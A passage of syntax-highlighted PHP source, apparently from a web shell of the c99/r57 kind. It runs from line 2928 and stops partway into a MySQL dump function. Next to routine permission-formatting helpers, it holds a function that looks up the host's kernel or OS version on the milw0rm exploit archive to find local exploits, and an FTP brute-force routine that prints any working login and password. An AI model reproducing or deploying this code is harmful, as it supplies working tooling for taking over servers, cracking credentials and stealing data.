<span class="lineno">2928</span> <span class="k">function</span> <span class="nf">tabsort</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$b</span><span class="p">)</span> <span class="p">{</span> <span class="k">global</span> <span class="nv">$v</span><span class="p">;</span> <span class="k">return</span> <span class="nb">strnatcmp</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$v</span><span class="p">],</span> <span class="nv">$b</span><span class="p">[</span><span class="nv">$v</span><span class="p">]);}</span>
<span class="lineno">2929</span> <span class="k">function</span> <span class="nf">view_perms_color</span><span class="p">(</span><span class="nv">$o</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2930</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;&lt;font class=red&gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2931</span>   <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;&lt;font color=white&gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2932</span>   <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;&lt;font color=green&gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2933</span> <span class="p">}</span>
<span class="lineno">2934</span> <span class="k">function</span> <span class="nf">view_perms</span><span class="p">(</span><span class="nv">$mode</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2935</span>   <span class="k">if</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;}</span>
<span class="lineno">2936</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;}</span>
<span class="lineno">2937</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;l&quot;</span><span class="p">;}</span>
<span class="lineno">2938</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;-&quot;</span><span class="p">;}</span>
<span class="lineno">2939</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;b&quot;</span><span class="p">;}</span>
<span class="lineno">2940</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;c&quot;</span><span class="p">;}</span>
<span class="lineno">2941</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;p&quot;</span><span class="p">;}</span>
<span class="lineno">2942</span>   <span class="k">else</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;}</span>
<span class="lineno">2943</span>   <span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00400</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;r&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno">2944</span>   <span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00200</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;w&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno">2945</span>   <span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00100</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;x&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno">2946</span>   <span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00040</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;r&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno">2947</span>   <span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00020</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;w&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno">2948</span>   <span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00010</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;x&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno">2949</span>   <span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00004</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;r&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno">2950</span>   <span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00002</span><span class="p">)</span><span class="o">?</span> <span class="s2">&quot;w&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno">2951</span>   <span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00001</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;x&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno">2952</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x800</span><span class="p">)</span> <span class="p">{</span><span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;s&quot;</span><span class="o">:</span><span class="s2">&quot;S&quot;</span><span class="p">;}</span>
<span class="lineno">2953</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x400</span><span class="p">)</span> <span class="p">{</span><span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;s&quot;</span><span class="o">:</span><span class="s2">&quot;S&quot;</span><span class="p">;}</span>
<span class="lineno">2954</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x200</span><span class="p">)</span> <span class="p">{</span><span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;t&quot;</span><span class="o">:</span><span class="s2">&quot;T&quot;</span><span class="p">;}</span>
<span class="lineno">2955</span>   <span class="k">return</span> <span class="nv">$type</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$owner</span><span class="p">)</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$group</span><span class="p">)</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$world</span><span class="p">);</span>
<span class="lineno">2956</span> <span class="p">}</span>
<span class="lineno">2957</span> <span class="k">function</span> <span class="nf">parsesort</span><span class="p">(</span><span class="nv">$sort</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2958</span>   <span class="nv">$one</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$sort</span><span class="p">);</span>
<span class="lineno">2959</span>   <span class="nv">$second</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sort</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno">2960</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$second</span> <span class="o">!=</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$second</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="p">;}</span>
<span class="lineno">2961</span>   <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$one</span><span class="p">,</span><span class="nv">$second</span><span class="p">);</span>
<span class="lineno">2962</span> <span class="p">}</span>
<span class="lineno">2963</span> <span class="k">function</span> <span class="nf">parse_perms</span><span class="p">(</span><span class="nv">$mode</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2964</span>   <span class="k">if</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;}</span>
<span class="lineno">2965</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;}</span>
<span class="lineno">2966</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;l&quot;</span><span class="p">;}</span>
<span class="lineno">2967</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;-&quot;</span><span class="p">;}</span>
<span class="lineno">2968</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;b&quot;</span><span class="p">;}</span>
<span class="lineno">2969</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;c&quot;</span><span class="p">;}</span>
<span class="lineno">2970</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;p&quot;</span><span class="p">;}</span>
<span class="lineno">2971</span>   <span class="k">else</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;}</span>
<span class="lineno">2972</span>   <span class="nv">$o</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00400</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$o</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00200</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$o</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00100</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">2973</span>   <span class="nv">$g</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00040</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$g</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00020</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$g</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00010</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">2974</span>   <span class="nv">$w</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00004</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$w</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00002</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$w</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00001</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">2975</span>   <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;t&quot;</span><span class="o">=&gt;</span><span class="nv">$t</span><span class="p">,</span><span class="s2">&quot;o&quot;</span><span class="o">=&gt;</span><span class="nv">$o</span><span class="p">,</span><span class="s2">&quot;g&quot;</span><span class="o">=&gt;</span><span class="nv">$g</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="o">=&gt;</span><span class="nv">$w</span><span class="p">);</span>
<span class="lineno">2976</span> <span class="p">}</span>
<span class="lineno">2977</span> <span class="k">function</span> <span class="nf">str2mini</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="nv">$len</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2978</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2979</span>     <span class="nv">$len</span> <span class="o">=</span> <span class="nb">ceil</span><span class="p">(</span><span class="nv">$len</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
<span class="lineno">2980</span>     <span class="k">return</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="nv">$len</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;...&quot;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="o">-</span><span class="nv">$len</span><span class="p">);</span>
<span class="lineno">2981</span>   <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2982</span> <span class="p">}</span>
<span class="lineno">2983</span> <span class="k">function</span> <span class="nf">strips</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$arr</span><span class="p">,</span><span class="nv">$k</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2984</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$arr</span><span class="p">))</span> <span class="p">{</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$k</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&quot;GLOBALS&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nx">strips</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="s2">&quot;</span><span class="si">$k</span><span class="s2">&quot;</span><span class="p">]);</span> <span class="p">}</span> <span class="p">}</span> <span class="p">}</span>
<span class="lineno">2985</span>   <span class="k">else</span> <span class="p">{</span> <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2986</span> <span class="p">}</span>
<span class="lineno">2987</span> <span class="k">function</span> <span class="nf">getmicrotime</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">2988</span>   <span class="k">list</span><span class="p">(</span><span class="nv">$usec</span><span class="p">,</span> <span class="nv">$sec</span><span class="p">)</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="nb">microtime</span><span class="p">());</span>
<span class="lineno">2989</span>   <span class="k">return</span> <span class="p">((</span><span class="nx">float</span><span class="p">)</span><span class="nv">$usec</span> <span class="o">+</span> <span class="p">(</span><span class="nx">float</span><span class="p">)</span><span class="nv">$sec</span><span class="p">);</span>
<span class="lineno">2990</span> <span class="p">}</span>
<span class="lineno">2991</span> <span class="k">function</span> <span class="nf">milw0rm</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">2992</span>   <span class="nv">$Lversion</span> <span class="o">=</span> <span class="nb">php_uname</span><span class="p">(</span><span class="s2">&quot;r&quot;</span><span class="p">);</span>
<span class="lineno">2993</span>   <span class="nv">$OSV</span> <span class="o">=</span> <span class="nb">php_uname</span><span class="p">(</span><span class="s2">&quot;s&quot;</span><span class="p">);</span>
<span class="lineno">2994</span>   <span class="k">if</span><span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;Linux&quot;</span><span class="p">,</span><span class="nv">$OSV</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2995</span>     <span class="nv">$Lversion</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$Lversion</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
<span class="lineno">2996</span>     <span class="k">return</span> <span class="s2">&quot;http://milw0rm.com/search.php?dong=Linux Kernel &quot;</span><span class="o">.</span><span class="nv">$Lversion</span><span class="p">;</span>
<span class="lineno">2997</span>   <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2998</span>     <span class="nv">$Lversion</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$Lversion</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
<span class="lineno">2999</span>     <span class="k">return</span> <span class="s2">&quot;http://milw0rm.com/search.php?dong=&quot;</span><span class="o">.</span><span class="nv">$OSV</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$Lversion</span><span class="p">;</span>
<span class="lineno">3000</span>   <span class="p">}</span>
<span class="lineno">3001</span> <span class="p">}</span>
<span class="lineno">3002</span> <span class="k">function</span> <span class="nf">fx29ftpbrutecheck</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$timeout</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">,</span><span class="nv">$sh</span><span class="p">,</span><span class="nv">$fqb_onlywithsh</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3003</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_onlywithsh</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$TRUE</span> <span class="o">=</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sh</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;/bin/FALSE&quot;</span><span class="p">,</span><span class="s2">&quot;/sbin/nologin&quot;</span><span class="p">)));</span> <span class="p">}</span>
<span class="lineno">3004</span>   <span class="k">else</span> <span class="p">{</span> <span class="nv">$TRUE</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">3005</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$TRUE</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3006</span>     <span class="nv">$sock</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ftp_connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$timeout</span><span class="p">);</span>
<span class="lineno">3007</span>     <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">ftp_login</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">3008</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">ftp://&quot;</span><span class="o">.</span><span class="nv">$login</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;@&quot;</span><span class="o">.</span><span class="nv">$host</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> target=</span><span class="se">\&quot;</span><span class="s2">_blank</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;Connected to &quot;</span><span class="o">.</span><span class="nv">$host</span><span class="o">.</span><span class="s2">&quot; with login </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$login</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> and password </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&lt;/b&gt;&lt;/a&gt;.&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">3009</span>       <span class="o">@</span><span class="nb">ob_flush</span><span class="p">();</span>
<span class="lineno">3010</span>       <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="lineno">3011</span>     <span class="p">}</span>
<span class="lineno">3012</span>   <span class="p">}</span>
<span class="lineno">3013</span> <span class="p">}</span>
<span class="lineno">3014</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;posix_getpwuid&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="k">function</span> <span class="nf">posix_getpwuid</span><span class="p">(</span><span class="nv">$uid</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
<span class="lineno">3015</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;posix_getgrgid&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="k">function</span> <span class="nf">posix_getgrgid</span><span class="p">(</span><span class="nv">$gid</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
<span class="lineno">3016</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;posix_kill&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="k">function</span> <span class="nf">posix_kill</span><span class="p">(</span><span class="nv">$gid</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
<span class="lineno">3017</span> <span class="c1">###[ MySQL FUNCTIONS ]###</span>
<span class="lineno">3018</span> <span class="k">function</span> <span class="nf">mysql_dump</span><span class="p">(</span><span class="nv">$set</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">3019</span>   <span class="nv">$sock</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;sock&quot;</span><span class="p">];</span>
<span class="lineno">3020</span>   <span class="nv">$db</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;db&quot;</span><span class="p">];</span>
<span class="lineno">3021</span>   <span class="nv">$print</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;print&quot;</span><span class="p">];</span>
<span class="lineno">3022</span>   <span class="nv">$nl2br</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;nl2br&quot;</span><span class="p">];</span>
<span class="lineno">3023</span>   <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">];</span>
<span class="lineno">3024</span>   <span class="nv">$add_drop</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;add_drop&quot;</span><span class="p">];</span>
<span class="lineno">3025</span>   <span class="nv">$tabs</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;tabs&quot;</span><span class="p">];</span>
<span class="lineno">3026</span>   <span class="nv">$onlytabs</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;onlytabs&quot;</span><span class="p">];</span>
<span class="lineno">3027</span>   <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">3028</span>   <span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
